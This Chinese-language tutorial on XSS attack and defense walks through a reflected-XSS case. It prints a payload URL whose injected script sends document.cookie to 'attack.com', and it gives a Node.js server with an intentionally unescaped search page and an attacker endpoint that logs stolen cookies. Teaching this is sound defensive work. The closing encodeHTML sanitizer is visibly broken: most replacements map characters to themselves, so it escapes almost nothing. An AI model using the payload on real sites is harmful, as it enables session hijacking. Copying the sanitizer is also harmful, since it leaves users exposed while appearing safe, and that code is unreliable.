# XSS攻防

很多网站会在用户登录完毕设置 Cookie 值或者返回一个 Token，这就相当于令牌，只要拿着这张令牌就等同于证明了你是某个用户。如果防御不到位，Cookie 和 Token 很容易被 XSS 攻击窃取到，此时攻击者就可以冒充真实的用户，在网站中为所欲为了。

XSS 的全称叫跨站脚本攻击（Cross Site Scripting），攻击出现的原因一般是因为 Web 程序对用户的输入过滤不足导致的一种漏洞，攻击者可以把恶意的脚本代码注入到网页之中，当其他用户浏览时就会执行其中的恶意代码，对受害者产生各种攻击。XSS 一般分为三种类型：

- 反射型
- 存储型
- DOM型

## 反射型 XSS 攻防实战

反射型 XSS 攻击的恶意脚本并没有被存储到后端数据库中，而是诱导用户点击某个精心拼接的恶意链接，从而达到攻击的目的。

### 攻击案例

一个常见的场景是用户在某电影网站搜索，假如请求地址是：

```js
https://xxx.com/movies?q=功夫熊猫
```

在后台返回的结果页中，会显示用户搜索的电影名：

```js
「功夫熊猫」的搜索结果为：
xxxxxxxxxxxxxxxxxxxxxxx
```

攻击者拼接了一个极度恶意的链接：

```js
https://xxx.com/movies?q=功夫熊猫<script>fetch(`https://attack.com?cookie=${document.cookie}`)</script>
```

如果用户点击了这个恶意链接，cookie 立马被盗。下面给出 `Node.js` 后端服务完整源码：

```js
const http = require('http')
const URL = require('url')

// HTML 模板
function renderHTML(tpl) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"/></head><body>${tpl}</body></html>`
}

// 路由分发器
const routes = {
  'GET /movies': (req, res) => { // 被攻击网站的电影搜索接口
    const tpl = req.query.q
      ? `<h3>「${req.query.q}」的搜索结果为：</h3>${Array(30).fill('x')}`
      : `请输入搜索的电影`
    res.setHeader('Set-Cookie', ['name=keliq', 'age=10'])
    res.end(renderHTML(tpl))
  },
  'GET /cookies': (req, res) => { // 攻击者后台收集cookie的接口
    console.log(req.query)
    res.end()
  },
}

function onRequest(req, res) {
  const { url, method } = req
  const { query, pathname } = URL.parse(url, true) // 解析 url
  Object.assign(req, { query, path: pathname }) // 并把 query 和 pathname 参数扩展到 req 对象
  const route = routes[[method, pathname].join(' ')] // 获取路由处理函数（策略模式）
  if (route) return route(req, res)
  res.statusCode = 404
  res.end('Not Found')
}

http.createServer(onRequest).listen(3000) // 被攻击的网站
http.createServer(onRequest).listen(4000) // 攻击者收集cookie的服务器
```

运行上面的代码，然后打开访问下面的恶意链接：

```js
http://localhost:3000/movies?q=功夫熊猫<script>fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)</script>
```

可以看到，用户的 Cookie 被发送到了攻击者的服务器。

### 防御方案

造成反射型 XSS 攻击的原因就是服务端没过滤，所以解决方案也很简单，就是在服务器对用户输入进行过滤，过滤方案一般有很多，例如直接用 `encodeURIComponent` 对查询参数进行过滤：

```js
const tpl = req.query.q
  ? `<h3>「${encodeURIComponent(req.query.q)}」的搜索结果为：</h3>${Array(30).fill('x')}`
  : `请输入搜索的电影`
```

还有一种方式是写一个函数替换掉那些 `<`、`&` 等特殊字符：

```js
function encodeHTML(str) {
  return str
    .replace(/&/g,'&')
    .replace(/"/g,'"')
    .replace(/'/g,'&apos;')
    .replace(/</g,'<')
    .replace(/>/g,'>')
}
```
